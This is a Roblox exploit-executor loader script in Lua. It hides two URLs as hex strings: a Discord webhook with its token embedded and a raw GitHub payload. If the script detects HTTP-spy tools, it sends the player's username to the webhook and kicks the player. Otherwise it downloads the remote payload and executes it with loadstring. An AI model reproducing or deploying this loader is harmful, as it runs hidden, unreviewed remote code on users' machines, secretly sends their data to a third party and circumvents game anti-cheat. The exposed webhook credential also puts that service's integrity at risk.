local function _D(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")

local _L = game:GetService("Players").LocalPlayer
local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local function _SC()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and info.source ~= "=[C]" then return true end
    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy", "HydroSpy", "TwiSpy"}) do if getgenv()[v] then return true end end
    return false
end

if _SC() then
    pcall(function()
        _req({
            Url = _A, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                embeds = {{title = "🚨 Security Alert: Interceptor Detected", description = "User " .. _L.Name .. " used HTTP Spy.", color = 16711680}}
            })
        })
    end)
    _L:Kick("Loader Error: 0xSECURITY")
    return
end

-- Создаем физический токен доступа в игроке
local _TK = Instance.new("StringValue")
_TK.Name = "__NK_INTERNAL_AUTH"
_TK.Value = "V8_NAZARKUS_PRO_SECURE"
_TK.Parent = _L

local ok, res = pcall(function() return game:HttpGet(_G) end)
if ok and res then
    local f = loadstring(res)
    if f then 
        task.spawn(function()
            local success, err = pcall(f)
            if not success then warn("Core startup error") end
        end)
    end
else
    _L:Kick("Connection Fail. Try again.")
end
